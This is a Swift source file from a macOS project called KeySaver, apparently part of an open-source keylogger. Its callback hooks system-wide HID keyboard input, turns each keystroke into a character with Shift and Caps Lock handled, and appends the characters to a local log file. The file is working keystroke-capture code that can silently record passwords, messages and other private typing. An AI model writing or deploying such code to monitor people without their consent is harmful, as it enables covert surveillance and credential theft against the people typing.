//
//  LoggerCallback.swift
//  KeySaver
//
//  Created by Skrew Everything on 16/01/17.
//  Copyright © 2017 Skrew Everything. All rights reserved.
//

import Foundation
import Cocoa

class LoggerCallback
{
    static var CAPSLOCK = false
    static var SHIFT = false
    static var calander = Calendar.current
    //    static var prev = ""
    static var command = false
    
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        
        let this = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let element: IOHIDElement = IOHIDValueGetElement(device);
        //        var test: Bool
        if IOHIDElementGetUsagePage(element) != 0x07 || this.appName == "KeySaver" {
            return
        }
        let code = IOHIDElementGetUsage(element);
        if (code < 4 || code > 231) {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device);
        //        var dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
        //        var path = Keylogger.keylogs.appendingPathComponent(dateFolder)
        //        if !FileManager.default.fileExists(atPath: path.path)
        //        {
        //            do
        //            {
        //                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
        //            }
        //            catch
        //            {
        //                print("Can't Create Folder")
        //            }
        //        }
        let filename = Keylogger.keylogs.appendingPathComponent("logs").path
        //        if CallbackFunctions.prev == fileName
        //        {
        //            test = false
        //        }
        //        else
        //        {
        //            test = true
        //            CallbackFunctions.prev = fileName
        //        }
        if !FileManager.default.fileExists(atPath: filename) {
            if !FileManager.default.createFile(atPath: filename, contents: nil, attributes: nil) {
                print("Can't Create File")
            }
        }
        let fh = FileHandle.init(forWritingAtPath: filename)
        fh?.seekToEndOfFile()
        //        if test
        //        {
        //            let timeStamp = "\n" + Date().description(with: Locale.current) + "\n"
        //            fh?.write(timeStamp.data(using: .utf8)!)
        //        }
        
        Outside:if pressed == 1 { // keydown
            if code == 57 { // Capslock
                LoggerCallback.CAPSLOCK = !LoggerCallback.CAPSLOCK
                break Outside
            }
            if code >= 58 && code <= 83 || code == 41 || code == 42 {
                break Outside
            }
            if code == 225 { // Shift
                LoggerCallback.SHIFT = true
                break Outside
            }
            if code >= 224 && code <= 231 || command {
                command = true
                //                fh?.write( (mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                //                print((mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                break Outside
            }
            
            if LoggerCallback.CAPSLOCK || LoggerCallback.SHIFT { // Show uppercase
                fh?.write(this.keyMap[code]![1].data(using: .utf8)!)
                print(this.keyMap[code]![1].data(using: .utf8)!)
            } else { // Show lowercase
                fh?.write(this.keyMap[code]![0].data(using: .utf8)!)
                print(this.keyMap[code]![0].data(using: .utf8)!)
            }
        } else { // keyup
            if code == 225 { // no more shift
                LoggerCallback.SHIFT = false
                break Outside
            }
            if code >= 224 && code <= 231 { // no more special keys
                command = false
                //                fh?.write(")".data(using: .utf8)!)
                //                print(")".data(using: .utf8)!)
            }
        }
    }
}
